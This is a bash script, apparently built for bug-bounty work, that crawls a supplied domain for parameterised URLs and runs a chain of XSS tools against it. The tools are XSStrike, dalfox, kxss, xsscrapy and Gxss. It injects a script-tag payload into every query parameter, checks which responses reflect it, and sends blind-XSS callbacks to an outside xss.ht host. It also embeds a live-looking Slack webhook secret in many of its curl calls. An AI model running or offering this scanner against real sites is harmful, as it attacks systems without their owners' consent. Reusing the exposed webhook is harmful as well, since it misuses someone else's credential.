#!/bin/bash
# gau
# hakrawler
# wayback
# kxss
# XSStrike
# XSSrapy
# dalfox


RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
NC='\033[0m'  #no color
PURPLE='\033[1;35m'
CYAN='\033[1;36m'

TARGET=$1
LOGFILE=backuplog
title=xss
mkdir -pv "${TARGET}/${title}"

trap ctrl_c INT

function ctrl_c() {
        echo "** Trapped CTRL-C, Removing Data..."
	mv *.txt ./${TARGET}/${title}/
	exit
}

curl -X POST -H 'Content-type: application/json' --data '{"text":"[+] Started With Xss '$1'"}' https://hooks.slack.com/services/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
echo -e "${GREEN}[+] ${YELLOW} Started with gau..${NC}"
cat ./$1/no_resolve_$1.txt | xargs -n1 -P10 gau > gau_$1.txt

echo -e "${GREEN}[+] ${YELLOW} Started with hakrawler..${NC}"
cat ./$1/no_resolve_$1.txt | xargs -n1 -P10 -I % sh -c 'hakrawler -url % -depth 1 -plain;' > hakrawler_$1.txt

echo -e "${GREEN}[*] ${CYAN} Started Scanning fGospider...."
gospider -S "./$1/httprobe_$1.txt" -o ./$1/xss/GoSpider -t 2 -c 5 -d 3 --blacklist jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,svg &>/dev/null
cat ./$1/xss/GoSpider/* > gospider_$1.txt

while read link
do
     	paramspider --domain $link --exclude svg,jpg,css,js | tee -a ./$1/xss/paramspider_$1.txt
done < ./$1/httprobe_$1.txt

gf xss ./$1/xss/paramspider_$1.txt | tee ./$1/xss/paramspiderxss_$1.txt
grep -Eo '(http|https)://[^"]+' ./$1/xss/paramspiderxss_$1.txt > xssurl_$1.txt

echo -e "${GREEN}[+] ${YELLOW} Started with waybackurls..${NC}"
cat ./$1/no_resolve_$1.txt | xargs -n1 -P10 waybackurls > wayback_$1.txt

echo -e "${GREEN}[!] ${YELLOW}Found $(wc -l wayback_$1.txt hakrawler_$1.txt gau_$1.txt gospider_$1.txt xssurl_$1.txt )${NC}"

#XSS Scanning started
curl -X POST -H 'Content-type: application/json' --data '{"text":"[+] 1. XSS Scanning Started with custom script '$1'"}' https://hooks.slack.com/services/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
echo -e "${GREEN}[*] ${CYAN} Started Scanning for XSS With custom Script...."
cat gau_$1.txt hakrawler_$1.txt wayback_$1.txt gospider_$1.txt xssurl_$1.txt | grep -oP -a '(http|https)://[^/"].*' | cut -d "]" -f1 | sed '/^$/d;s/[[:blank:]]//g' | sort -u >> urls_$1.txt
echo -e "${GREEN}[!] ${YELLOW} Count of urls_$1.txt is: $(expr $(cat urls_$1.txt| wc -l ) - 3)"

hakrawler -url "$1" -plain -usewayback -wayback | grep "$1" | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|pbg|ttf|woff|woff2|ico|pdf|svg|txt|js)" | qsreplace '"><script>confirm(1)</script>' | tee combinedfuzz.json && cat combinedfuzz.json | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo -e "$host \e[1;31m Found... \e[0m ] \n" | tee -a vulnxss_$1.txt || echo -e "$host \e[1;42m Not Vulnerbale \e[0m ] \n"; done > allxss_$1.txt
echo -e "${GREEN}[!] ${CYAN} Done with custom Script and saved at allxss_$1.txt"
curl -X POST -H 'Content-type: application/json' --data '{"text":"[!]Completed With custom Script '$1'"}' https://hooks.slack.com/services/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

curl -X POST -H 'Content-type: application/json' --data '{"text":"[+] 2. kxss Started '$1'"}' https://hooks.slack.com/services/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
echo -e "${GREEN}[*] ${CYAN} Started Scanning for KXSS...."
cat gau_$1.txt hakrawler_$1.txt wayback_$1.txt gospider_$1.txt xssurl_$1.txt | grep -oP -a '(http|https)://[^/"].*' | cut -d "]" -f1 | sed '/^$/d;s/[[:blank:]]//g' | sort -u >> allxssfinal_$1.txt
cat allxssfinal_$1.txt | kxss >> kxss_$1.txt
curl -X POST -H 'Content-type: application/json' --data '{"text":"[!] Completed With kxss '$1'"}' https://hooks.slack.com/services/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

curl -X POST -H 'Content-type: application/json' --data '{"text":"[+] 3. xsstrike Started '$1'"}' https://hooks.slack.com/services/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
echo -e "${GREEN}[+] ${CYAN} Started Scanning for XSStrike...."
cat ./$1/no_resolve_$1.txt | httpx -silent | xargs -n1 -P10 -I@ sh -c 'xsstrike -u @ --crawl' >> xsstrike_$1.txt
curl -X POST -H 'Content-type: application/json' --data '{"text":"[!] Completed With xsstrike '$1'"}' https://hooks.slack.com/services/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

curl -X POST -H 'Content-type: application/json' --data '{"text":"[+] 4. xsscrapy Started '$1'"}' https://hooks.slack.com/services/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
echo -e "${GREEN}[+] ${CYAN} Started Scanning for xsscrapy...."
cat ./$1/httprobe_$1.txt | xargs -I % xsscrapy -u % -c 50 &>/dev/null
curl -X POST -H 'Content-type: application/json' --data '{"text":"[!] Completed With xsscrapy '$1'"}' https://hooks.slack.com/services/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

curl -X POST -H 'Content-type: application/json' --data '{"text":"[+] 5. Dalfox - 2 Started '$1'"}' https://hooks.slack.com/services/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
echo -e "${GREEN}[*] ${CYAN} Started With DAlfox Scanning.."
cat ./$1/no_resolve_$1.txt | xargs -I % waybackurls % | grep "http://" | grep "=" | unew -combine | kxss | sed 's/=.*/=/' | sed 's/URL: //' | dalfox pipe -o dalfox.txt &>/dev/null
curl -X POST -H 'Content-type: application/json' --data '{"text":"[!] Completed With Dalfox - 2 '$1'"}' https://hooks.slack.com/services/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

curl -X POST -H 'Content-type: application/json' --data '{"text":"[+] 6. Gxss Started '$1'"}' https://hooks.slack.com/services/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
cat ./$1/httprobe_$1.txt | waybackurls | httpx -silent | Gxss -c 100 -p Xss | grep "URL" | cut -d '"' -f2 | sort -u | dalfox pipe | tee Gxsstest_$1.txt &>/dev/null
curl -X POST -H 'Content-type: application/json' --data '{"text":"[!] Completed With Gxss - 1 '$1'"}' https://hooks.slack.com/services/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

curl -X POST -H 'Content-type: application/json' --data '{"text":"[+] 7. DAlfox - 1 Started '$1'"}' https://hooks.slack.com/services/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
echo -e "${GREEN}[*] ${CYAN} Started Scanning for XSS With DAlfox...."
cat urls_$1.txt | dalfox pipe -b https://tnashte.xss.ht -o ./$1/xss/paramdalafox_$1.txt
echo -e "${GREEN}[*] ${CYAN} done Scanning for XSS With DAlfox...."
curl -X POST -H 'Content-type: application/json' --data '{"text":"[!] Completed With Dalfox - 1 '$1'"}' https://hooks.slack.com/services/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

curl -X POST -H 'Content-type: application/json' --data '{"text":"[+] Merging and Moving folder '$1'"}' https://hooks.slack.com/services/T01AQE9LR4Y/B01EVSURW2D/oGbWTd0ORMyuxWTcZ2eeNtP
echo -e "${GREEN}[-] ${PURPLE} moving files to ./$1/xss folder"
mv *.txt *.json ./$1/xss

echo -e "${GREEN}[+] ${PURPLE} Done...${NC}"
curl -X POST -H 'Content-type: application/json' --data '{"text":"[+] -----XSS Scanning Completed----- '$1'"}' https://hooks.slack.com/services/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
